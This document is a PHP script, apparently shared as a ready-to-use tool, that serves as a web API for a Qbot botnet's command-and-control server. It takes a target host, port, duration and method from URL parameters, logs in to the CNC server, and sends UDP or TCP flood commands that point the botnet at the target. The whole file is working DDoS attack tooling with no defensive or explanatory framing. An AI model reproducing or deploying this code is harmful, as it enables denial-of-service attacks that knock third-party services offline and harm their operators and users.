<?php
//@blazing_runs
//API Link: http://ServerIP/qbotapi.php?&host=$host&port=$port&time=$time&type=$method
set_time_limit(0);
 
//CNC SERVER IP
$server = "YOUR_IP_HERE";//qbot
 
//CNC PORT
$conport = YOUR_PORT_HERE;
 
//Net Login
$username = "Login";
$password = "Pass";
 
$activekeys = array();
 
$method = $_GET['type'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
 
 
//Commands (change accordingly)
if($method == "UDP"){$command = "!* UDP $target $port $time 32 0 10";}
if($method == "TCP"){$command = "!* TCP $target $port $time 32 all 0 10";}
 
$sock = fsockopen($server, $conport, $errno, $errstr, 2);
 
if(!$sock){
        echo "Couldn't Connect To CNC Server...";
} else{
        print(fread($sock, 1024)."\n");
        fwrite($sock, $username . "\n");
        echo "<br>";
        print(fread($sock, 1024)."\n");
        fwrite($sock, $password . "\n");
        echo "<br>";
        if(fread($sock, 1024)){
                print(fread($sock, 1024)."\n");
        }
 
        fwrite($sock, $command . "\n");
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>